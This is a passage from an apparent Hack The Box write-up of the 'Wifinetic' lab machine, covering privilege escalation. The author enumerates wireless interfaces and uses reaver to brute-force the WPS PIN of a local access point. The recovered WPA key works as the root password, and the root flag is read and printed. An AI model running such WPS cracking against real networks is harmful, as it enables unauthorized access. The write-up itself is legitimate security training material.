+</span></span><span style="display:flex;"><span>        ether 00:50:56:b9:5b:8e  txqueuelen <span style="color:#ae81ff">1000</span>  <span style="color:#f92672">(</span>Ethernet<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        RX packets <span style="color:#ae81ff">9710</span>  bytes <span style="color:#ae81ff">1692995</span> <span style="color:#f92672">(</span>1.6 MB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        RX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span>  overruns <span style="color:#ae81ff">0</span>  frame <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        TX packets <span style="color:#ae81ff">8675</span>  bytes <span style="color:#ae81ff">4929079</span> <span style="color:#f92672">(</span>4.9 MB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        TX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span> overruns <span style="color:#ae81ff">0</span>  carrier <span style="color:#ae81ff">0</span>  collisions <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>lo: flags<span style="color:#f92672">=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span style="color:#ae81ff">65536</span>
+</span></span><span style="display:flex;"><span>        inet 127.0.0.1  netmask 255.0.0.0
+</span></span><span style="display:flex;"><span>        inet6 ::1  prefixlen <span style="color:#ae81ff">128</span>  scopeid 0x10&lt;host&gt;
+</span></span><span style="display:flex;"><span>        loop  txqueuelen <span style="color:#ae81ff">1000</span>  <span style="color:#f92672">(</span>Local Loopback<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        RX packets <span style="color:#ae81ff">8750</span>  bytes <span style="color:#ae81ff">525392</span> <span style="color:#f92672">(</span>525.3 KB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        RX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span>  overruns <span style="color:#ae81ff">0</span>  frame <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        TX packets <span style="color:#ae81ff">8750</span>  bytes <span style="color:#ae81ff">525392</span> <span style="color:#f92672">(</span>525.3 KB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        TX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span> overruns <span style="color:#ae81ff">0</span>  carrier <span style="color:#ae81ff">0</span>  collisions <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mon0: flags<span style="color:#f92672">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span style="color:#ae81ff">1500</span>
+</span></span><span style="display:flex;"><span>        unspec 02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00  txqueuelen <span style="color:#ae81ff">1000</span>  <span style="color:#f92672">(</span>UNSPEC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        RX packets <span style="color:#ae81ff">44609</span>  bytes <span style="color:#ae81ff">7855748</span> <span style="color:#f92672">(</span>7.8 MB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        RX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">44571</span>  overruns <span style="color:#ae81ff">0</span>  frame <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        TX packets <span style="color:#ae81ff">0</span>  bytes <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>0.0 B<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        TX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span> overruns <span style="color:#ae81ff">0</span>  carrier <span style="color:#ae81ff">0</span>  collisions <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wlan0: flags<span style="color:#f92672">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span style="color:#ae81ff">1500</span>
+</span></span><span style="display:flex;"><span>        inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255
+</span></span><span style="display:flex;"><span>        inet6 fe80::ff:fe00:0  prefixlen <span style="color:#ae81ff">64</span>  scopeid 0x20&lt;link&gt;
+</span></span><span style="display:flex;"><span>        ether 02:00:00:00:00:00  txqueuelen <span style="color:#ae81ff">1000</span>  <span style="color:#f92672">(</span>Ethernet<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        RX packets <span style="color:#ae81ff">1489</span>  bytes <span style="color:#ae81ff">141260</span> <span style="color:#f92672">(</span>141.2 KB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        RX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">203</span>  overruns <span style="color:#ae81ff">0</span>  frame <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        TX packets <span style="color:#ae81ff">1735</span>  bytes <span style="color:#ae81ff">201893</span> <span style="color:#f92672">(</span>201.8 KB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        TX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span> overruns <span style="color:#ae81ff">0</span>  carrier <span style="color:#ae81ff">0</span>  collisions <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wlan1: flags<span style="color:#f92672">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span style="color:#ae81ff">1500</span>
+</span></span><span style="display:flex;"><span>        inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255
+</span></span><span style="display:flex;"><span>        inet6 fe80::ff:fe00:100  prefixlen <span style="color:#ae81ff">64</span>  scopeid 0x20&lt;link&gt;
+</span></span><span style="display:flex;"><span>        ether 02:00:00:00:01:00  txqueuelen <span style="color:#ae81ff">1000</span>  <span style="color:#f92672">(</span>Ethernet<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        RX packets <span style="color:#ae81ff">438</span>  bytes <span style="color:#ae81ff">60545</span> <span style="color:#f92672">(</span>60.5 KB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        RX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span>  overruns <span style="color:#ae81ff">0</span>  frame <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        TX packets <span style="color:#ae81ff">1478</span>  bytes <span style="color:#ae81ff">166300</span> <span style="color:#f92672">(</span>166.3 KB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        TX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span> overruns <span style="color:#ae81ff">0</span>  carrier <span style="color:#ae81ff">0</span>  collisions <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wlan2: flags<span style="color:#f92672">=</span>4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu <span style="color:#ae81ff">1500</span>
+</span></span><span style="display:flex;"><span>        ether 02:00:00:00:02:00  txqueuelen <span style="color:#ae81ff">1000</span>  <span style="color:#f92672">(</span>Ethernet<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        RX packets <span style="color:#ae81ff">0</span>  bytes <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>0.0 B<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        RX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span>  overruns <span style="color:#ae81ff">0</span>  frame <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        TX packets <span style="color:#ae81ff">0</span>  bytes <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>0.0 B<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        TX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span> overruns <span style="color:#ae81ff">0</span>  carrier <span style="color:#ae81ff">0</span>  collisions <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p>I check the <code>wireless network interfaces</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netadmin@wifinetic:~$ iwconfig
+</span></span><span style="display:flex;"><span>lo        no wireless extensions.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wlan1     IEEE 802.11  ESSID:off/any  
+</span></span><span style="display:flex;"><span>          Mode:Managed  Access Point: Not-Associated   Tx-Power<span style="color:#f92672">=</span><span style="color:#ae81ff">20</span> dBm   
+</span></span><span style="display:flex;"><span>          Retry short limit:7   RTS thr:off   Fragment thr:off
+</span></span><span style="display:flex;"><span>          Power Management:on
+</span></span><span style="display:flex;"><span>          
+</span></span><span style="display:flex;"><span>wlan0     IEEE 802.11  Mode:Master  Tx-Power<span style="color:#f92672">=</span><span style="color:#ae81ff">20</span> dBm   
+</span></span><span style="display:flex;"><span>          Retry short limit:7   RTS thr:off   Fragment thr:off
+</span></span><span style="display:flex;"><span>          Power Management:on
+</span></span><span style="display:flex;"><span>          
+</span></span><span style="display:flex;"><span>eth0      no wireless extensions.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>hwsim0    no wireless extensions.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wlan2     IEEE 802.11  ESSID:off/any  
+</span></span><span style="display:flex;"><span>          Mode:Managed  Access Point: Not-Associated   Tx-Power<span style="color:#f92672">=</span><span style="color:#ae81ff">20</span> dBm   
+</span></span><span style="display:flex;"><span>          Retry short limit:7   RTS thr:off   Fragment thr:off
+</span></span><span style="display:flex;"><span>          Power Management:on
+</span></span><span style="display:flex;"><span>          
+</span></span><span style="display:flex;"><span>mon0      IEEE 802.11  Mode:Monitor  Tx-Power<span style="color:#f92672">=</span><span style="color:#ae81ff">20</span> dBm   
+</span></span><span style="display:flex;"><span>          Retry short limit:7   RTS thr:off   Fragment thr:off
+</span></span><span style="display:flex;"><span>          Power Management:on
+</span></span></code></pre></div><p>I discover the <code>addresses</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netadmin@wifinetic:~$ iw dev
+</span></span><span style="display:flex;"><span>phy#2
+</span></span><span style="display:flex;"><span>        Interface mon0
+</span></span><span style="display:flex;"><span>                ifindex <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>                wdev 0x200000002
+</span></span><span style="display:flex;"><span>                addr 02:00:00:00:02:00
+</span></span><span style="display:flex;"><span>                type monitor
+</span></span><span style="display:flex;"><span>                txpower 20.00 dBm
+</span></span><span style="display:flex;"><span>        Interface wlan2
+</span></span><span style="display:flex;"><span>                ifindex <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>                wdev 0x200000001
+</span></span><span style="display:flex;"><span>                addr 02:00:00:00:02:00
+</span></span><span style="display:flex;"><span>                type managed
+</span></span><span style="display:flex;"><span>                txpower 20.00 dBm
+</span></span><span style="display:flex;"><span>phy#1
+</span></span><span style="display:flex;"><span>        Unnamed/non-netdev interface
+</span></span><span style="display:flex;"><span>                wdev 0x10000006d
+</span></span><span style="display:flex;"><span>                addr 42:00:00:00:01:00
+</span></span><span style="display:flex;"><span>                type P2P-device
+</span></span><span style="display:flex;"><span>                txpower 20.00 dBm
+</span></span><span style="display:flex;"><span>        Interface wlan1
+</span></span><span style="display:flex;"><span>                ifindex <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>                wdev 0x100000001
+</span></span><span style="display:flex;"><span>                addr 02:00:00:00:01:00
+</span></span><span style="display:flex;"><span>                ssid OpenWrt
+</span></span><span style="display:flex;"><span>                type managed
+</span></span><span style="display:flex;"><span>                channel <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">2412</span> MHz<span style="color:#f92672">)</span>, width: <span style="color:#ae81ff">20</span> MHz <span style="color:#f92672">(</span>no HT<span style="color:#f92672">)</span>, center1: <span style="color:#ae81ff">2412</span> MHz
+</span></span><span style="display:flex;"><span>                txpower 20.00 dBm
+</span></span><span style="display:flex;"><span>phy#0
+</span></span><span style="display:flex;"><span>        Interface wlan0
+</span></span><span style="display:flex;"><span>                ifindex <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>                wdev 0x1
+</span></span><span style="display:flex;"><span>                addr 02:00:00:00:00:00
+</span></span><span style="display:flex;"><span>                ssid OpenWrt
+</span></span><span style="display:flex;"><span>                type AP
+</span></span><span style="display:flex;"><span>                channel <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">2412</span> MHz<span style="color:#f92672">)</span>, width: <span style="color:#ae81ff">20</span> MHz <span style="color:#f92672">(</span>no HT<span style="color:#f92672">)</span>, center1: <span style="color:#ae81ff">2412</span> MHz
+</span></span><span style="display:flex;"><span>                txpower 20.00 dBm
+</span></span></code></pre></div><p>I  get the <code>capabilities</code> for all the files recursively under the given directories:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netadmin@wifinetic:~$ getcap -r / 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper <span style="color:#f92672">=</span> cap_net_bind_service,cap_net_admin+ep
+</span></span><span style="display:flex;"><span>/usr/bin/ping <span style="color:#f92672">=</span> cap_net_raw+ep
+</span></span><span style="display:flex;"><span>/usr/bin/mtr-packet <span style="color:#f92672">=</span> cap_net_raw+ep
+</span></span><span style="display:flex;"><span>/usr/bin/traceroute6.iputils <span style="color:#f92672">=</span> cap_net_raw+ep
+</span></span><span style="display:flex;"><span>/usr/bin/reaver <span style="color:#f92672">=</span> cap_net_raw+ep
+</span></span></code></pre></div><p>I discover a useful tool to discover root password, I perform a <code>brute force attack</code> against an access point’s WiFi:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netadmin@wifinetic:~$ reaver -i mon0 -b 02:00:00:00:00:00 -vv  -c <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Reaver v1.6.5 WiFi Protected Setup Attack Tool
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> 2011, Tactical Network Solutions, Craig Heffner &lt;cheffner@tacnetsol.com&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Switching mon0 to channel <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Waiting <span style="color:#66d9ef">for</span> beacon from 02:00:00:00:00:00
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Received beacon from 02:00:00:00:00:00
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Trying pin <span style="color:#e6db74">&#34;12345670&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Sending authentication request
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Found packet with bad FCS, skipping...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Sending association request
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Associated with 02:00:00:00:00:00 <span style="color:#f92672">(</span>ESSID: OpenWrt<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Sending EAPOL START request
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Received identity request
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Sending identity response
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Received M1 message
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Sending M2 message
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Received M3 message
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Sending M4 message
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Received M5 message
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Sending M6 message
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Received M7 message
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Sending WSC NACK
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Sending WSC NACK
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Pin cracked in <span style="color:#ae81ff">2</span> seconds
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> WPS PIN: <span style="color:#e6db74">&#39;12345670&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> WPA PSK: <span style="color:#e6db74">&#39;WhatIsRealAnDWhAtIsNot51121!&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> AP SSID: <span style="color:#e6db74">&#39;OpenWrt&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Nothing <span style="color:#66d9ef">done</span>, nothing to save.
+</span></span></code></pre></div><p>Credentials:</p>
+<pre tabindex="0"><code>- Username: root
+- Password: WhatIsRealAnDWhAtIsNot51121!
+</code></pre><p>I can use the <code>WPA PSK</code> to login like root:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netadmin@wifinetic:~$ su root
+</span></span><span style="display:flex;"><span>Password: 
+</span></span><span style="display:flex;"><span>root@wifinetic:/home/netadmin# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>root@wifinetic:/home/netadmin# cd /root/ <span style="color:#f92672">&amp;&amp;</span> ls -all
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">7</span> root root <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">11</span> 17:24 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">20</span> root root <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">11</span> 16:40 ..
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">8</span> 15:16 .ansible
+</span></span><span style="display:flex;"><span>lrwxrwxrwx  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> Jan <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">2021</span> .bash_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">3106</span> Dec  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2019</span> .bashrc
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">8</span> 15:16 .cache
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">8</span> 15:16 .local
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">161</span> Dec  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2019</span> .profile
+</span></span><span style="display:flex;"><span>lrwxrwxrwx  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> Sep  <span style="color:#ae81ff">7</span> 14:19 .python_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>-rw-r-----  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">33</span> Sep <span style="color:#ae81ff">17</span> 11:42 root.txt
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">8</span> 15:16 snap
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">8</span> 15:16 .ssh
+</span></span></code></pre></div><p>I get the <code>root flag</code>:</p>
+<pre tabindex="0"><code>root@wifinetic:~# cat root.txt
+0d225f66660245ce6f489fa7b2997ab1
+</code></pre>
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="/posts/pilgrimage/">
+                <span class="button__text">HTB Writeup - Pilgrimage (Easy)</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io">CyberSpider</a></span> 
+    
+        <span>::  </span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
